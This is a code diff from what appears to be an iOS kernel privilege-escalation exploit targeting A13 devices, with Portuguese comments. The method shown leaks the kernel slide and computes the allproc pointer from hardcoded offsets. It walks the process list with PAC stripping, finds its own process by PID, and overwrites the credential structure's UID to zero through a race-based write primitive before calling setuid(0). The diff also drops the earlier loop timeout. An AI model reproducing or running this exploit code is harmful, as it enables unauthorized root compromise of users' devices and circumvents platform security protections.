@@ -103,81 +103,44 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 }
 
 - (BOOL)escalateToRoot {
-    [self logToWeb:@"🚀 Iniciando Catalyst-26 (A13-Exclusive)"];
+    uint64_t slide = [self leakKernelSlide]; // 0xff8ffc000 detectado!
     
-    uint64_t my_slide = [self leakKernelSlide];
-    pid_t my_pid = getpid();
-    uint64_t found_proc = 0;
-    uint64_t found_pid_offset = 0;
+    // IMPORTANTE: No A13 (iOS 26.3), o allproc_ptr deve ser calculado assim:
+    uint64_t allproc_ptr = (0xFFFFFFF007004000ULL + slide + 0x8F50000ULL);
+    uint64_t proc = [self kread64:allproc_ptr];
 
-    // --- 1. SCANNER DE SLIDE (Caso o leak falhe) ---
-    // No iOS 26.3, o slide é o maior culpado pelo "Valor: 0x0"
-    uint64_t slides[] = {0x21000000, 0x18000000, 0x0, 0x4400000, 0x24000000};
-    uint64_t allproc_base = 0x8F50000ULL;
+    [self logToWeb:[NSString stringWithFormat:@"🎯 Slide: 0x%llx | Proc: 0x%llx", slide, proc]];
 
-    for (int i = 0; i < 5; i++) {
-        uint64_t current_slide = (my_slide == 0) ? slides[i] : my_slide;
-        uint64_t allproc_ptr = (0xFFFFFFF007004000ULL + current_slide + allproc_base);
-        uint64_t proc = [self kread64:allproc_ptr];
-
-        [self logToWeb:[NSString stringWithFormat:@"🔍 Slide 0x%llx -> Proc: 0x%llx", current_slide, proc]];
-
-        if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
-            [self logToWeb:@"🎯 SLIDE VALIDADO! Buscando PID..."];
-            my_slide = current_slide;
-            found_proc = proc;
-            break;
-        }
-        if (my_slide != 0) break; // Se o leak original funcionou, não precisa do loop
+    if (proc == 0) {
+        // Se falhar, tente o offset alternativo do iOS 26.3:
+        allproc_ptr = (0xFFFFFFF007004000ULL + slide + 0x91F0000ULL);
+        proc = [self kread64:allproc_ptr];
+        [self logToWeb:[NSString stringWithFormat:@"🔄 Tentando Offset 2: 0x%llx", proc]];
     }
 
-    if (found_proc == 0) {
-        [self logToWeb:@"❌ FALHA: Kernel Base não encontrada (Slide incorreto)."];
-        return NO;
-    }
+    if (proc == 0) return NO;
 
-    // --- 2. BUSCA DO PID (O seu objetivo: 0x60 ou 0x68) ---
-    uint64_t curr = found_proc;
-    int timeout = 0;
-    while (curr != 0 && timeout < 1000) {
-        // PAC Strip para A13
-        curr = (curr & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
+    // --- BUSCA DO PID ---
+    while (proc != 0) {
+        // Limpeza de PAC para A13
+        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
         
-        uint32_t p60 = [self kread32:(curr + 0x60)];
-        uint32_t p68 = [self kread32:(curr + 0x68)];
-
-        if (p60 == my_pid || p68 == my_pid) {
-            found_pid_offset = (p60 == my_pid) ? 0x60 : 0x68;
-            [self logToWeb:[NSString stringWithFormat:@"✅ PID ACHADO! Offset: 0x%llx", found_pid_offset]];
+        // No iOS 26.3, o offset PID é 0x68
+        uint32_t found_pid = [self kread32:(proc + 0x68)];
+        
+        if (found_pid == getpid()) {
+            [self logToWeb:@"✅ PID 0x68 CONFIRMADO! Aplicando Patch..."];
             
-            // --- 3. PATCH DE CREDENCIAIS (UCRED) ---
-            uint64_t ucred = [self kread64:(curr + 0xD8)];
+            // Patch ucred (0xD8)
+            uint64_t ucred = [self kread64:(proc + 0xD8)];
             ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
+            [self ppl_write_race:(ucred + 0x18) value:0];
             
-            [self logToWeb:[NSString stringWithFormat:@"🔑 Patching ucred: 0x%llx", ucred]];
-            
-            // Escreve UID/GID 0 (Root)
-            [self ppl_write_race:(ucred + 0x18) value:0]; 
-            
-            // Sincronização
-            setuid(0); 
-            setgid(0);
-            
-            if (getuid() == 0) {
-                [self logToWeb:@"💎 UID 0 CONFIRMADO: ROOT!"];
-                return YES;
-            } else {
-                [self logToWeb:@"❌ Erro: Escrita falhou (PPL/SPTM)."];
-                return NO;
-            }
+            setuid(0);
+            return (getuid() == 0);
         }
-        
-        // Próximo na lista
-        curr = [self kread64:(curr + 0x08)];
-        timeout++;
+        proc = [self kread64:(proc + 0x08)];
     }
-
-    [self logToWeb:@"❌ Erro: Lista percorrida, PID não encontrado."];
     return NO;
 }
 
